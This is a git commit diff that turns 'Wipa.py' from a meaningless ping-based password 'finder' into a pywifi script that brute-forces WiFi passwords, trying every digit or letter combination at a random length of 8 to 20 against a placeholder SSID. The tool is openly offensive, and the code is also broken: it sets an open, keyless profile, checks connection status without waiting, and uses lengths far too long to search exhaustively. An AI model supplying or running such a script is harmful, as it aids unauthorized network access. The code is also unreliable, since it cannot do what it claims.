8b84e48c4ca9d81d616aaebb78eda0db96770395
Dominik Hulin <109801079+Fattcat@users.noreply.github.com>
2023-05-14 21:41:55 +0200

    Update Wipa.py

--- Wipa.py
+++ Wipa.py
@@ -1,15 +1,111 @@
-import string
-import random
-import os
-from time import sleep
+import itertools
 
-while True:
-    password_length = random.randint(8, 20)
-    password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(password_length))
-    response = os.system(f"ping -n 1 -w 1 192.168.0.149 -w 500 > nul && ping -n 1 -w 1 google.com -w 500 > nul && ping -n 1 -w 1 yahoo.com -w 500 > nul")
-    if response == 0:
-        print(f"Correct password found: {password}")
-        break
-    else:
-        print(f"Incorrect password: {password}")
-sleep(0.6)
+import random
+
+import pywifi
+
+from pywifi import const
+
+# initialize wifi interface
+
+wifi = pywifi.PyWiFi()
+
+iface = wifi.interfaces()[0]
+
+iface.disconnect()
+
+# read input
+
+choice = input("My choice is: ")
+
+# define brute force functions
+
+def bruteforce_numbers(length):
+
+    chars = "0123456789"
+
+    for pwd in itertools.product(chars, repeat=length):
+
+        pwd_str = "".join(pwd)
+
+        print("Trying", pwd_str)
+
+        profile = pywifi.Profile()
+
+        profile.ssid = "YOUR_WIFI_SSID"
+
+        profile.auth = const.AUTH_ALG_OPEN
+
+        profile.akm.append(const.AKM_TYPE_NONE)
+
+        profile.cipher = const.CIPHER_TYPE_CCMP
+
+        profile.key = pwd_str
+
+        iface.remove_all_network_profiles()
+
+        tmp_profile = iface.add_network_profile(profile)
+
+        iface.connect(tmp_profile)
+
+        if iface.status() == const.IFACE_CONNECTED:
+
+            print("\033[32mPassword found:", pwd_str, "\033[0m")
+
+            return
+
+def bruteforce_letters(length):
+
+    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+
+    for pwd in itertools.product(chars, repeat=length):
+
+        pwd_str = "".join(pwd)
+
+        print("Trying", pwd_str)
+
+        profile = pywifi.Profile()
+
+        profile.ssid = "YOUR_WIFI_SSID"
+
+        profile.auth = const.AUTH_ALG_OPEN
+
+        profile.akm.append(const.AKM_TYPE_NONE)
+
+        profile.cipher = const.CIPHER_TYPE_CCMP
+
+        profile.key = pwd_str
+
+        iface.remove_all_network_profiles()
+
+        tmp_profile = iface.add_network_profile(profile)
+
+        iface.connect(tmp_profile)
+
+        if iface.status() == const.IFACE_CONNECTED:
+
+            print("\033[32mPassword found:", pwd_str, "\033[0m")
+
+            return
+
+# run chosen brute force function
+
+if choice == "1":
+
+    length = random.randint(8, 20)
+
+    print("Starting WiFi password bruteforce with NUMBERS ONLY", length, "Chars")
+
+    bruteforce_numbers(length)
+
+elif choice == "2":
+
+    length = random.randint(8, 20)
+
+    print("Starting WiFi password bruteforce with letters only (big and small)", length, "Chars")
+
+    bruteforce_letters(length)
+
+else:
+
+    print("Invalid choice")
